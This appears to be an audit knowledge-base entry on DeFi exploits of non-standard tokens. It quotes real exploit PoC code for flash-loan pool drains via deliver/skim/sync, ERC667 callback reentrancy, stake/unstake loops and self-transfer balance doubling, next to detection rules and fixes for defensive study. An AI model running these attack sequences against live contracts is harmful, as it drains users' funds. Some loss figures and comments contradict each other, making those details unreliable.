---
# Core Classification (Required)
protocol: generic
chain: everychain
category: token_compatibility
vulnerability_type: non_standard_token_behavior

# Attack Vector Details (Required)
attack_type: token_incompatibility|economic_exploit|reentrancy
affected_component: token_transfer|balance_tracking|amm_integration|lending_pool

# Technical Primitives (Required)
primitives:
  - reflection_token
  - fee_on_transfer
  - deflationary_token
  - rebasing_token
  - ERC777
  - ERC667
  - callback_token
  - deliver
  - skim
  - sync
  - self_transfer
  - balance_manipulation
  - pair_reserves
  - onTokenTransfer
  - tokensReceived
  - tokensToSend

# Impact Classification (Required)
severity: high
impact: fund_loss|pool_drain|reentrancy
exploitability: 0.8
financial_impact: critical

# Context Tags
tags:
  - defi
  - amm
  - lending
  - token
  - reflection
  - deflationary
  - rebasing
  - erc777
  - reentrancy
  - real_exploit
  - dex
  - pair
  - skim
  - sync

# Version Info
language: solidity
version: all
source: DeFiHackLabs
---

## References & Source Reports

> **For Agents**: These are real-world exploits from DeFiHackLabs repository. Read the PoC files for detailed attack mechanics.

### Reflection Token Exploits (Fee Distribution Manipulation)
| Exploit | Date | Loss | PoC Path |
|---------|------|------|----------|
| MARS - Bad Reflection | 2024-04 | >$100K | `DeFiHackLabs/src/test/2024-04/MARS_exp.sol` |
| HODL - Reflection Token | 2023-05 | ~$300K | `DeFiHackLabs/src/test/2023-05/HODLCapital_exp.sol` |
| BEVO - Reflection Token | 2023-02 | ~$45K | `DeFiHackLabs/src/test/2023-01/BEVO_exp.sol` |
| TINU - Reflection Token | 2023-02 | ~$22K | `DeFiHackLabs/src/test/2023-01/TINU_exp.sol` |
| Sheep - Reflection Token | 2023-02 | ~$600K | `DeFiHackLabs/src/test/2023-02/Sheep_exp.sol` |

### Deflationary Token Exploits
| Exploit | Date | Loss | PoC Path |
|---------|------|------|----------|
| KRC - Deflationary Token | 2025-05 | ~$26K | `DeFiHackLabs/src/test/2025-05/KRCToken_pair_exp.sol` |
| AES - Deflationary Token | 2022-12 | ~$60K | `DeFiHackLabs/src/test/2022-12/AES_exp.sol` |
| BGLD - Deflationary Token | 2022-12 | ~$18K | `DeFiHackLabs/src/test/2022-12/BGLD_exp.sol` |

### ERC777/ERC667 Callback Reentrancy Exploits
| Exploit | Date | Loss | PoC Path |
|---------|------|------|----------|
| Agave Finance - ERC667 Reentrancy | 2022-03 | $1.5M | `DeFiHackLabs/src/test/2022-03/Agave_exp.sol` |
| Hundred Finance - ERC667 Reentrancy | 2022-03 | $1.7M | `DeFiHackLabs/src/test/2022-03/HundredFinance_exp.sol` |

### Rebasing Token Exploits
| Exploit | Date | Loss | PoC Path |
|---------|------|------|----------|
| HeavensGate - Rebasing Logic | 2023-09 | ~$142K | `DeFiHackLabs/src/test/2023-09/HeavensGate_exp.sol` |
| JumpFarm - Rebasing Logic | 2023-09 | ~$10.9K | `DeFiHackLabs/src/test/2023-09/JumpFarm_exp.sol` |
| FloorDAO - Rebasing Logic | 2023-09 | ~$40K | `DeFiHackLabs/src/test/2023-09/FloorDAO_exp.sol` |

### Self-Transfer Exploits
| Exploit | Date | Loss | PoC Path |
|---------|------|------|----------|
| GPU - Self Transfer | 2024-05 | ~$32K | `DeFiHackLabs/src/test/2024-05/GPU_exp.sol` |
| SSS - Balance Doubles on Self Transfer | 2024-03 | ~$173K | `DeFiHackLabs/src/test/2024-03/SSS_exp.sol` |
| LPC - Incorrect Recipient Balance Check | 2022-07 | ~$45K | `DeFiHackLabs/src/test/2022-07/LPC_exp.sol` |

---

# Non-Standard Token Vulnerabilities - Comprehensive Database

**Real-World Exploit Patterns from DeFiHackLabs**

---

## Table of Contents

1. [Overview](#overview)
2. [Reflection Token Vulnerabilities](#1-reflection-token-vulnerabilities)
3. [Deflationary Token Vulnerabilities](#2-deflationary-token-vulnerabilities)
4. [ERC777/ERC667 Callback Reentrancy](#3-erc777erc667-callback-reentrancy)
5. [Rebasing Token Vulnerabilities](#4-rebasing-token-vulnerabilities)
6. [Self-Transfer Edge Cases](#5-self-transfer-edge-cases)
7. [Low/No Decimals Token Issues](#6-lowno-decimals-token-issues)
8. [Pausable/Blacklistable Token Risks](#7-pausableblacklistable-token-risks)
9. [Detection Patterns](#detection-patterns)
10. [Secure Implementation](#secure-implementation)

---

## Overview

Non-standard ERC20 tokens implement custom transfer logic that breaks fundamental assumptions made by DeFi protocols. These tokens include:

| Token Type | Behavior | Attack Vector |
|------------|----------|---------------|
| Reflection Tokens | Distribute fees to holders via `_rOwned` | `deliver()` + `skim()` to drain AMM pairs |
| Deflationary Tokens | Burn/redirect on transfer | Reserve desync with `skim()` + `sync()` |
| ERC777/ERC667 | Transfer callbacks | Reentrancy during lending operations |
| Rebasing Tokens | Balance changes without transfer | `stake()/unstake()` loops to inflate balance |
| Self-Transfer Bugs | Broken self-transfer logic | Balance doubles on `transfer(self, balance)` |

**Total Documented Losses**: >$5M from analyzed DeFiHackLabs exploits

---

## 1. Reflection Token Vulnerabilities

### Overview

Reflection tokens (like SafeMoon clones) use two balance tracking systems:
- `_rOwned`: Reflection-based balance (used for fee distribution)
- `_tOwned`: Token-based balance (for excluded addresses)

The `deliver()` function burns tokens from sender and distributes value to all reflection-holding addresses. This creates an arbitrage opportunity when AMM pairs receive reflections.

### Root Cause

AMM pairs (Uniswap V2 style) track reserves via the `sync()` function which updates `reserve0`/`reserve1` to match `balanceOf()`. When reflection tokens distribute fees, the pair's `balanceOf()` increases without `sync()` being called, creating a discrepancy between:
- **Cached reserves**: Used for swap calculations
- **Actual balance**: Higher due to received reflections

The `skim()` function sends excess tokens (balance - reserve) to an address, allowing extraction of accumulated reflections.

### Attack Scenario (BEVO Pattern - Real Exploit)

```
1. Attacker flash loans WBNB (192.5 BNB)
2. Swap WBNB -> BEVO (reflection token)
3. Call BEVO.deliver(balance) - burns attacker's tokens, distributes to all holders including pair
4. Call pair.skim(attacker) - extracts accumulated reflections from pair
5. Call BEVO.deliver(balance) again - repeat to maximize extraction
6. Swap extracted BEVO back to WBNB
7. Repay flash loan with profit
```

### Vulnerable Pattern Example (AMM Pair with Reflection Token) [CRITICAL]

```solidity
// ❌ VULNERABLE: AMM pair holding reflection token
// The pair receives reflections but reserves don't update
contract UniswapV2Pair {
    uint112 private reserve0;
    uint112 private reserve1;
    
    // Reserves only update on swap/mint/burn, NOT on reflection receipt
    function getReserves() public view returns (uint112, uint112, uint32) {
        return (reserve0, reserve1, blockTimestampLast);
    }
    
    // skim() allows extraction of reflection accumulation
    function skim(address to) external {
        address _token0 = token0;
        address _token1 = token1;
        // Sends (actual_balance - reserve) to `to`
        // @audit Attacker extracts reflections accumulated by pair
        IERC20(_token0).transfer(to, IERC20(_token0).balanceOf(address(this)) - reserve0);
        IERC20(_token1).transfer(to, IERC20(_token1).balanceOf(address(this)) - reserve1);
    }
}
```

### Real Attack Code (BEVO - $45K Loss)

```solidity
// From DeFiHackLabs/src/test/2023-01/BEVO_exp.sol
function pancakeCall(...) external {
    // Step 1: Buy reflection tokens
    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        wbnb.balanceOf(address(this)), 0, path, address(this), block.timestamp
    );
    
    // Step 2: Deliver tokens - distributes to all holders INCLUDING PAIR
    bevo.deliver(bevo.balanceOf(address(this)));
    
    // Step 3: Skim - extract reflections from pair
    bevo_wbnb.skim(address(this));
    
    // Step 4: Deliver again to maximize
    bevo.deliver(bevo.balanceOf(address(this)));
    
    // Step 5: Swap with inflated reserves - pair has less tokens than reserves claim
    bevo_wbnb.swap(337 ether, 0, address(this), "");
}
```

### Real Attack Code (TINU - $22K Loss)

```solidity
// From DeFiHackLabs/src/test/2023-01/TINU_exp.sol
function receiveFlashLoan(...) external {
    // Swap WETH for TINU
    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        104.85 ether, 0, path, address(this), type(uint256).max
    );
    
    console.log("%s TINU in pair before deliver", TINU.balanceOf(address(TINU_WETH)));
    
    // deliver() burns attacker tokens, increases pair's reflection balance
    TINU.deliver(TINU.balanceOf(address(this)));
    
    console.log("%s TINU in pair after deliver", TINU.balanceOf(address(TINU_WETH)));
    
    // skim() extracts the reflection surplus from pair
    TINU_WETH.skim(address(this));
    
    // deliver() again with skimmed tokens
    TINU.deliver(TINU.balanceOf(address(this)));
    
    // Final extraction - swap at manipulated rate
    TINU_WETH.swap(0, WETH.balanceOf(address(TINU_WETH)) - 0.01 ether, address(this), "");
}
```

### Complex Attack (HODL Capital - $300K Loss)

The HODL exploit is more sophisticated, using flash swaps with callback manipulation:

```solidity
// From DeFiHackLabs/src/test/2023-05/HODLCapital_exp.sol
function func2574(uint256 v0) internal {
    // deliver() to redistribute to pair
    hodl.deliver(amount1000 * v0 / 1000);
    // skim() to extract accumulated reflections
    hodl_weth.skim(excludedFromFeeAddress);
}

// Called 50+ times to drain reflections iteratively
for (uint256 i = 0; i < 15; i++) {
    func2574(900);
}
```

---

## 2. Deflationary Token Vulnerabilities

### Overview

Deflationary tokens burn or redirect a percentage on every transfer. When combined with AMM pair mechanics, attackers can desynchronize cached reserves from actual balances.

### Root Cause

When deflationary tokens are transferred TO a pair:
1. Transfer burns X% of tokens
2. Pair receives less than transferred amount
3. If attacker manipulates `skim()` + `sync()` + `distributeFee()`, reserves can be corrupted

### Attack Scenario (AES Pattern)

```
1. Flash loan USDT
2. Swap USDT -> AES (deflationary token)
3. Transfer 50% of AES to pair (triggers deflation)
4. Loop: pair.skim(pair) 37 times - redistributes within pair
5. pair.skim(attacker) - extract accumulated tokens
6. AES.distributeFee() - trigger any pending fee distribution
7. pair.sync() - update reserves to current (depleted) balance
8. Swap AES -> USDT at favorable rate
```

### Vulnerable Pattern (Deflationary + Skim Loop) [HIGH]

```solidity
// ❌ VULNERABLE: Skim-to-self loop with deflationary token
// Each skim triggers transfer, which burns tokens, creating more skim-able surplus

function exploit() external {
    // Transfer triggers burn, pair receives less than reserves expect
    deflationaryToken.transfer(address(pair), balance / 2);
    
    // Skim to self repeatedly - exploits reserve/balance mismatch
    for (uint256 i = 0; i < 37; i++) {
        pair.skim(address(pair)); // Deflationary transfer creates new surplus
    }
    pair.skim(address(this)); // Final extraction
    
    // Distribute any accumulated fees
    deflationaryToken.distributeFee();
    
    // Sync reserves to match depleted balance
    pair.sync();
    
    // Swap at favorable rate (reserves now lower)
    swapToBaseToken();
}
```

### Real Attack Code (AES - $60K Loss)

```solidity
// From DeFiHackLabs/src/test/2022-12/AES_exp.sol
function DPPFlashLoanCall(...) external {
    USDTToAES();
    
    // Transfer half to pair
    AES.transfer(address(Pair), AES.balanceOf(address(this)) / 2);
    
    // Skim loop - 37 iterations
    for (uint256 i = 0; i < 37; i++) {
        Pair.skim(address(Pair));
    }
    Pair.skim(address(this));
    
    // Trigger fee distribution
    AES.distributeFee();
    
    // Sync reserves to actual balance
    Pair.sync();
    
    // Swap depleted reserves
    AESToUSDT();
}
```

### Real Attack Code (KRC - $26K Loss - 2025)

```solidity
// From DeFiHackLabs/src/test/2025-05/KRCToken_pair_exp.sol
// Uses precise transfer + skim iterations to desync reserves

// Step 7: Series of 17 precise transfers and skims
krcToken.transfer(address(krc_pair), 26158607120271760914);
krc_pair.skim(address(this));
krcToken.transfer(address(krc_pair), 23542746408244584823);
krc_pair.skim(address(this));
// ... 15 more iterations with decreasing amounts

// Step 8: Extract at manipulated reserves
krc_pair.swap(0, amountOutUSDT, address(this), new bytes(0));
```

### Real Attack Code (BGLD - $18K Loss)

```solidity
// From DeFiHackLabs/src/test/2022-12/BGLD_exp.sol
function DPPFlashLoanCall(...) external {
    // Transfer to pair
    WBNB.transfer(address(WBNB_oldBGLD), WBNB.balanceOf(address(this)));
    
    // Swap
    WBNB_oldBGLD.swap(0, values[1] * 90 / 100, address(this), "");
    
    // Manipulate - transfer 10x reserve to pair
    oldBGLD.transfer(address(WBNB_oldBGLD), oldBGLD.balanceOf(address(WBNB_oldBGLD)) * 10 + 10);
    
    // Skim excess
    WBNB_oldBGLD.skim(address(this));
    
    // Sync to corrupted state
    WBNB_oldBGLD.sync();
}
```

### Sheep Token Attack (Burn Manipulation - $600K)

```solidity
// From DeFiHackLabs/src/test/2023-02/Sheep_exp.sol
function DPPFlashLoanCall(...) external {
    WBNBToSHEEP();
    
    // Burn all tokens except pair's balance
    while (SHEEP.balanceOf(address(Pair)) > 2) {
        uint256 burnAmount = SHEEP.balanceOf(address(this));
        SHEEP.burn(burnAmount);  // Deflationary burn
    }
    
    // Sync pair to depleted state
    Pair.sync();
    
    // Swap at massively favorable rate
    SHEEPToWBNB();
}
```

---

## 3. ERC777/ERC667 Callback Reentrancy

### Overview

ERC777 and ERC667 tokens implement callbacks during transfer:
- **ERC777**: `tokensToSend()` (before transfer), `tokensReceived()` (after transfer)
- **ERC667**: `onTokenTransfer()` (after transfer)

These callbacks enable reentrancy in protocols not designed for them.

### Root Cause

Lending protocols (Compound forks like Agave, Hundred Finance) perform state updates AFTER external calls to token contracts. When tokens have transfer callbacks, attackers can re-enter before state updates complete.

### Attack Scenario (Agave/Hundred Pattern - $3.2M Combined)

```
1. Setup undercollateralized position (health factor just above 1)
2. Wait for interest to accrue (health factor drops below 1)
3. Call liquidationCall() on self
4. During aToken burn, onTokenTransfer callback fires
5. In callback: deposit more collateral + borrow maximum from all pools
6. Original liquidation completes, but attacker has extracted funds
```

### Vulnerable Pattern (Compound Fork + ERC667) [CRITICAL]

```solidity
// ❌ VULNERABLE: Aave V2 fork aToken with ERC667 callback
contract aToken {
    function _burn(address account, uint256 amount) internal {
        _balances[account] -= amount;
        _totalSupply -= amount;
        
        // @audit VULNERABLE: Callback BEFORE state finalization
        // ERC667 onTokenTransfer fires here
        if (account.isContract()) {
            ITransferReceiver(account).onTokenTransfer(address(this), amount, "");
        }
        
        emit Transfer(account, address(0), amount);
    }
}

// ❌ VULNERABLE: Lending pool without reentrancy guard on borrow
contract LendingPool {
    function borrow(address asset, uint256 amount, ...) external {
        // No reentrancy guard
        // State changes happen here but can be re-entered
        _borrow(asset, amount, onBehalfOf);
    }
}
```

### Real Attack Code (Hundred Finance - $1.7M Loss)

```solidity
// From DeFiHackLabs/src/test/2022-03/HundredFinance_exp.sol
function attackLogic(...) internal {
    // Deposit USDC, borrow USDC (creates position)
    depositUsdc();
    borrowUsdc();
    
    // During borrow callback, borrow XDAI
    // This happens inside onTokenTransfer
}

function borrowXdai() internal {
    xdaiBorrowed = true;
    uint256 amount = ((totalBorrowed * 1e12) * 60) / 100;
    ICompoundToken(hxdai).borrow(amount);
}

// ERC667 callback - fires during token operations
function onTokenTransfer(address _from, uint256 _value, bytes memory _data) external {
    IUniswapV2Factory factory = IUniswapV2Factory(router.factory());
    address pair = factory.getPair(address(wxdai), address(usdc));
    
    // Re-enter during callback to borrow more
    if (_from != pair && xdaiBorrowed == false) {
        console.log("''i'm in!''");
        borrowXdai();  // REENTRANCY - borrow during callback
    }
}
```

### Real Attack Code (Agave Finance - $1.5M Loss)

```solidity
// From DeFiHackLabs/src/test/2022-03/Agave_exp.sol
function _attackLogic(...) internal {
    // Fast forward to make health factor < 1
    vm.warp(block.timestamp + 1 hours);
    vm.roll(block.number + 1);
    
    // Self-liquidation triggers callback
    lendingPool.liquidationCall(weth, weth, address(this), 2, false);
    
    // Withdraw after draining in callback
    lendingPool.withdraw(weth, _getTokenBal(aweth), address(this));
}

// Modifier that deposits flashloan and borrows at end
modifier boostLTVHack() {
    lendingPool.deposit(weth, WETH.balanceOf(address(this)) - 1, address(this), 0);
    _;
    lendingPool.borrow(weth, wethLiqBeforeHack, 2, 0, address(this));
}

function borrowTokens() internal boostLTVHack {
    // Borrow from all pools during callback
    for (uint i = 0; i < 5; i++) {
        _borrow(assetAddrs[i]);
    }
}

// ERC667 callback fires on aToken burn
function onTokenTransfer(address _from, uint256 _value, bytes memory _data) external {
    if (_from == aweth && _value == 1) {
        callCount++;
        if (callCount == 2) {
            borrowTokens();  // REENTRANCY - borrow during liquidation
        }
    }
}
```

---

## 4. Rebasing Token Vulnerabilities

### Overview

Rebasing tokens (OHM forks, staking derivatives) automatically adjust balances based on protocol mechanics. The `stake()/unstake()` pattern can be exploited when:
- Rebasing calculation is manipulable
- No cooldown between stake/unstake
- Flash loans can amplify position

### Root Cause

OHM-style staking contracts convert tokens to "staked" tokens (sOHM) at a dynamic exchange rate. If the rate calculation can be manipulated within a single transaction, attackers can profit from repeated stake/unstake cycles.

### Attack Scenario (FloorDAO Pattern)

```
1. Flash loan FLOOR tokens
2. Loop: stake() -> immediately unstake() with _rebase=true
3. Each cycle: receive slightly more FLOOR due to rebasing mechanism
4. After 17 iterations: significant profit accumulated
5. Repay flash loan
```

### Vulnerable Pattern (Rebasing Staking) [HIGH]

```solidity
// ❌ VULNERABLE: No rate limiting between stake/unstake
contract FloorStaking {
    function stake(address _to, uint256 _amount, bool _rebasing, bool _claim) external {
        // Convert FLOOR to sFloor/gFloor at current rate
        sFloor.mint(_to, _amount);
    }
    
    function unstake(address _to, uint256 _amount, bool _trigger, bool _rebasing) external {
        // @audit Can be called immediately after stake
        // No cooldown, no rate limiting
        sFloor.burn(msg.sender, _amount);
        floor.transfer(_to, _amount);
    }
}
```

### Real Attack Code (FloorDAO - $40K Loss)

```solidity
// From DeFiHackLabs/src/test/2023-09/FloorDAO_exp.sol
function uniswapV3FlashCallback(uint256, uint256 fee1, bytes calldata) external {
    uint256 i = 0;
    while (i < 17) {
        uint256 balanceAttacker = floor.balanceOf(address(this));
        uint256 balanceStaking = floor.balanceOf(address(staking));
        uint256 circulatingSupply = sFloor.circulatingSupply();
        
        // Exploit condition: combined balance > circulating supply
        if (balanceAttacker + balanceStaking > circulatingSupply) {
            floor.approve(address(staking), balanceAttacker);
            
            // Stake
            staking.stake(address(this), balanceAttacker, false, true);
            
            uint256 gFloorBalance = gFloor.balanceOf(address(this));
            
            // Immediately unstake with rebase
            staking.unstake(address(this), gFloorBalance, true, false);
            
            i += 1;
        }
    }
    // Profit: received more FLOOR than deposited
    floor.transfer(msg.sender, flashAmount + fee1);
}
```

### Real Attack Code (JumpFarm - $10.9K Loss)

```solidity
// From DeFiHackLabs/src/test/2023-09/JumpFarm_exp.sol
function receiveFlashLoan(...) external {
    // Swap to JUMP tokens
    router.swapExactTokensForTokens(amounts[0], 0, path, address(this), block.timestamp);
    
    jump.approve(address(staking), type(uint256).max);
    sJump.approve(address(staking), type(uint256).max);
    
    uint8 i = 0;
    while (i < uint8(userData[0])) {  // userData[0] = 0x28 = 40 iterations
        i += 1;
        uint256 amountJump = jump.balanceOf(address(this));
        
        // Stake
        staking.stake(address(this), amountJump);
        
        uint256 amountSJump = sJump.balanceOf(address(this));
        
        // Unstake with rebase
        staking.unstake(address(this), amountSJump, true);
    }
    
    // Swap inflated balance back
    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(...);
}
```

### Real Attack Code (HeavensGate - $142K Loss)

```solidity
// From DeFiHackLabs/src/test/2023-09/HeavensGate_exp.sol
// Similar pattern to FloorDAO but with HATE token

function uniswapV2Call(...) external {
    uint256 i = 0;
    while (i < uint8(data[0])) {  // Multiple iterations
        uint256 balanceAttacker = HATE.balanceOf(address(this));
        
        // Stake
        HATEStaking.stake(address(this), balanceAttacker);
        
        uint256 sTokenBalance = sHATE.balanceOf(address(this));
        
        // Unstake
        HATEStaking.unstake(address(this), sTokenBalance, true);
        
        i += 1;
    }
    // Repay with profit
    HATE.transfer(address(HATE_ETH_Pair), uint256(amount0 * 1000 / 997) + 1);
}
```

---

## 5. Self-Transfer Edge Cases

### Overview

Some tokens have broken self-transfer logic where `transfer(address(this), balance)` causes unexpected behavior:
- Balance doubles
- Balance zeroes
- State corruption

### Root Cause

Faulty `_transfer()` implementation that doesn't handle `from == to`:

```solidity
// ❌ VULNERABLE: Doesn't handle self-transfer
function _transfer(address from, address to, uint256 amount) internal {
    _balances[from] -= amount;    // Subtract from sender
    _balances[to] += amount;      // Add to receiver
    // When from == to, this effectively DOUBLES the balance
}
```

### Attack Scenario (GPU/SSS Pattern)

```
1. Flash loan base token
2. Swap for vulnerable token
3. Loop: transfer(self, balance) - balance doubles each iteration
4. After N iterations: balance = original * 2^N
5. Swap inflated balance back
6. Repay flash loan with massive profit
```

### Vulnerable Pattern (Self-Transfer Balance Doubling) [CRITICAL]

```solidity
// ❌ VULNERABLE: Balance doubles on self-transfer
contract VulnerableToken {
    mapping(address => uint256) public _balances;
    
    function _transfer(address from, address to, uint256 amount) internal {
        require(_balances[from] >= amount, "Insufficient balance");
        
        // When from == to:
        // _balances[from] -= amount;  (e.g., 100 - 100 = 0)
        // _balances[to] += amount;    (e.g., 0 + 100 = 100)
        // Result: balance is preserved BUT...
        
        // Some implementations have fee/reward logic that breaks this:
        uint256 fee = amount * taxRate / 100;
        uint256 netAmount = amount - fee;
        
        _balances[from] -= amount;       // Subtract full amount
        _balances[to] += netAmount;      // Add reduced amount
        _balances[feeRecipient] += fee;  // Add fee elsewhere
        
        // When from == to with this logic:
        // If fee calculation adds bonus instead of taking fee...
        // Or if balance check happens after subtraction...
        // Balance can double!
    }
}
```

### Real Attack Code (GPU - $32K Loss)

```solidity
// From DeFiHackLabs/src/test/2024-05/GPU_exp.sol
function pancakeCall(...) external {
    // Buy tokens with flashloaned BUSD
    _swap(amount0, busd, gpuToken);
    
    // Self transfer tokens to double balance on each transfer
    for (uint256 i = 0; i < 87; i++) {
        gpuToken.transfer(address(this), getBalance(gpuToken));
        // Balance doubles each iteration!
    }
    
    // Sell all tokens (now 2^87 times original? limited by overflow)
    _swap(type(uint112).max, gpuToken, busd);
    
    // Payback flashloan with profit
    busd.transfer(address(busdWbnbPair), amount0 + feeAmount);
}
```

### Real Attack Code (SSS - $4.8M Loss)

```solidity
// From DeFiHackLabs/src/test/2024-03/SSS_exp.sol
function testExploit() public {
    // Buy 1 ETH of tokens
    ROUTER_V2.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        ethFlashAmt, 0, getPath(true), address(this), block.timestamp
    );
    
    // Transfer to self until balance reaches target
    uint256 targetBal = ROUTER_V2.getAmountsIn(
        WETH.balanceOf(POOL) - 29.5 ether, 
        getPath(false)
    )[0];
    
    while (SSS.balanceOf(address(this)) < targetBal) {
        SSS.transfer(address(this), SSS.balanceOf(address(this)));
        // Balance doubles each iteration!
    }
    
    // Burn excess to avoid overflow
    SSS.burn(SSS.balanceOf(address(this)) - targetBal);
    
    // Drain pool
    sssPool.swap(targetETH, 0, address(this), new bytes(0));
}
```

### Real Attack Code (LPC - $45K Loss)

```solidity
// From DeFiHackLabs/src/test/2022-07/LPC_exp.sol
function pancakeCall(...) external {
    // Self-transfer loop
    for (uint8 i; i < 10; ++i) {
        console.log("\tSelf transfer... Loop %s", i);
        IERC20(LPC).transfer(address(this), LPC_balance);
        // Balance increases each iteration due to flawed logic
    }
    
    // Payback is less than extracted value
    uint256 paybackAmount = amount0 / 90 / 100 * 10_000;
    IERC20(LPC).transfer(pancakePair, paybackAmount);
}
```

---

## 6. Low/No Decimals Token Issues

### Overview

Tokens with low decimals (0-6) or non-standard decimals can cause:
- Precision loss in calculations
- Rounding exploits
- Division by zero edge cases

### Vulnerable Patterns

**Precision Loss with Low Decimals** [MEDIUM]
```solidity
// ❌ VULNERABLE: Precision loss with low decimal tokens
function calculateShares(uint256 amount, uint256 totalAssets, uint256 totalShares) {
    // With USDC (6 decimals) vs WETH (18 decimals)
    // Small amounts round to zero
    return amount * totalShares / totalAssets;
    // 0.000001 USDC * shares / assets = 0 (rounds down)
}
```

**Zero Decimal Token Swap** [MEDIUM]
```solidity
// ❌ VULNERABLE: Division before multiplication with 0 decimal token
function getAmountOut(uint256 amountIn) {
    // amountIn = 1 (smallest unit of 0 decimal token)
    // rate = 0.5 (represented as 5000 / 10000)
    uint256 out = amountIn * 5000 / 10000;  // = 0
    // User loses entire input
}
```

---

## 7. Pausable/Blacklistable Token Risks

### Overview

Centralized tokens (USDC, USDT) can:
- Pause all transfers
- Blacklist specific addresses
- Upgrade contract logic

### Vulnerable Patterns

**Frozen Collateral** [HIGH]
```solidity
// ❌ VULNERABLE: No handling for paused tokens
contract LendingPool {
    function liquidate(address user) external {
        // If collateral token is paused, this reverts
        // User cannot be liquidated, protocol accumulates bad debt
        collateralToken.transfer(liquidator, collateralAmount);
    }
}
```

**Blacklisted Protocol** [HIGH]
```solidity
// ❌ VULNERABLE: Protocol address can be blacklisted
contract Vault {
    function withdraw() external {
        // If vault is blacklisted by USDC, all user funds trapped
        USDC.transfer(msg.sender, userBalance);  // REVERTS
    }
}
```

---

## Detection Patterns

### Code Patterns to Look For

```
Reflection Token Indicators:
- deliver() function
- _rOwned mapping
- reflectionFromToken()
- tokenFromReflection()
- isExcluded() / isExcludedFromFee()
- _reflectFee() internal function

Deflationary Token Indicators:
- burn() on transfer
- distributeFee()
- _taxFee / _burnFee variables
- Transfer amount != received amount

ERC777/ERC667 Indicators:
- IERC777Recipient interface
- tokensReceived() / tokensToSend()
- onTokenTransfer()
- registerRecipient()
- ERC1820Registry interactions

Rebasing Token Indicators:
- rebase() function
- _gonsPerFragment
- scaledBalanceOf()
- INITIAL_FRAGMENTS_SUPPLY

Self-Transfer Vulnerable Patterns:
- _transfer without from == to check
- Balance modification without atomic update
- Fee calculation during self-transfer
```

### Semgrep Detection Rules

```yaml
rules:
  - id: reflection-token-skim-exploit
    patterns:
      - pattern: |
          $PAIR.skim($TO)
      - pattern-inside: |
          $TOKEN.deliver($AMOUNT)
          ...
    message: "Potential reflection token skim exploit"
    severity: ERROR
    
  - id: erc777-reentrancy
    patterns:
      - pattern: |
          function onTokenTransfer(...) external {
            ...
            $CONTRACT.borrow(...)
            ...
          }
    message: "ERC667 callback with borrow - reentrancy risk"
    severity: ERROR
    
  - id: rebasing-stake-unstake-loop
    patterns:
      - pattern: |
          while (...) {
            ...
            $STAKING.stake(...)
            ...
            $STAKING.unstake(...)
            ...
          }
    message: "Rebasing token stake/unstake loop - potential exploit"
    severity: WARNING
    
  - id: self-transfer-vulnerability
    patterns:
      - pattern: |
          $TOKEN.transfer(address(this), $TOKEN.balanceOf(address(this)))
      - pattern-inside: |
          for (...) { ... }
    message: "Self-transfer in loop - check for balance doubling"
    severity: ERROR
```

### Audit Checklist

- [ ] Does the protocol integrate with AMM pairs holding reflection tokens?
- [ ] Are `skim()` and `sync()` exposed without access control?
- [ ] Does the protocol use Compound-fork lending with ERC667/ERC777 tokens?
- [ ] Are there reentrancy guards on all state-changing functions?
- [ ] Does the protocol integrate rebasing/staking tokens?
- [ ] Is there cooldown between stake/unstake operations?
- [ ] Do any integrated tokens have self-transfer bugs?
- [ ] Is there a token whitelist or do they accept arbitrary tokens?
- [ ] Can integrated tokens be paused or blacklist the protocol?
- [ ] Are low-decimal tokens handled with proper precision?

---

## Secure Implementation

### Fix 1: Reflection Token Protection

```solidity
// ✅ SECURE: Disable skim for reflection tokens or measure actual balance
contract SecureAMMPair {
    mapping(address => bool) public isReflectionToken;
    
    function skim(address to) external {
        require(!isReflectionToken[token0] && !isReflectionToken[token1], 
                "Skim disabled for reflection tokens");
        // Normal skim logic
    }
    
    // Or: Update reserves on every operation
    function _updateReserves() internal {
        reserve0 = IERC20(token0).balanceOf(address(this));
        reserve1 = IERC20(token1).balanceOf(address(this));
    }
}
```

### Fix 2: ERC777 Reentrancy Protection

```solidity
// ✅ SECURE: Reentrancy guard on all lending operations
contract SecureLendingPool is ReentrancyGuard {
    function borrow(address asset, uint256 amount, ...) 
        external 
        nonReentrant  // Prevents callback reentrancy
    {
        _borrow(asset, amount, onBehalfOf);
    }
    
    function liquidationCall(...) external nonReentrant {
        // Safe from callback reentrancy
    }
}
```

### Fix 3: Rebasing Token Cooldown

```solidity
// ✅ SECURE: Cooldown between stake/unstake
contract SecureStaking {
    mapping(address => uint256) public lastStakeTime;
    uint256 public constant COOLDOWN = 1 days;
    
    function stake(address _to, uint256 _amount) external {
        lastStakeTime[msg.sender] = block.timestamp;
        // Stake logic
    }
    
    function unstake(address _to, uint256 _amount) external {
        require(
            block.timestamp >= lastStakeTime[msg.sender] + COOLDOWN,
            "Cooldown not elapsed"
        );
        // Unstake logic
    }
}
```

### Fix 4: Self-Transfer Protection

```solidity
// ✅ SECURE: Handle self-transfer explicitly
function _transfer(address from, address to, uint256 amount) internal {
    require(from != address(0), "Transfer from zero");
    require(to != address(0), "Transfer to zero");
    require(_balances[from] >= amount, "Insufficient balance");
    
    // Explicit self-transfer handling
    if (from == to) {
        // No-op for self-transfer (or revert if not intended)
        return;
    }
    
    _balances[from] -= amount;
    _balances[to] += amount;
    
    emit Transfer(from, to, amount);
}
```

### Fix 5: Token Whitelist

```solidity
// ✅ SECURE: Only allow vetted non-problematic tokens
contract SecureVault {
    mapping(address => bool) public approvedTokens;
    
    function deposit(address token, uint256 amount) external {
        require(approvedTokens[token], "Token not approved");
        // Only tokens that have been verified as non-problematic
    }
    
    function approveToken(address token) external onlyAdmin {
        // Off-chain verification that token is:
        // - Not reflection/deflationary
        // - Not ERC777
        // - Not rebasing
        // - No self-transfer bugs
        approvedTokens[token] = true;
    }
}
```

---

## Keywords for Search

`reflection token`, `deliver`, `skim`, `sync`, `_rOwned`, `tokenFromReflection`, `reflectionFromToken`, `deflationary token`, `burn on transfer`, `fee on transfer`, `ERC777`, `ERC667`, `onTokenTransfer`, `tokensReceived`, `tokensToSend`, `reentrancy callback`, `rebasing token`, `stake unstake`, `rebase exploit`, `self transfer`, `balance double`, `transfer to self`, `pair manipulation`, `reserve desync`, `AMM exploit`, `SafeMoon`, `OHM fork`, `BEVO`, `TINU`, `HODL`, `Agave`, `Hundred Finance`, `FloorDAO`, `GPU token`, `SSS token`, `LPC token`

---

## Related Vulnerabilities

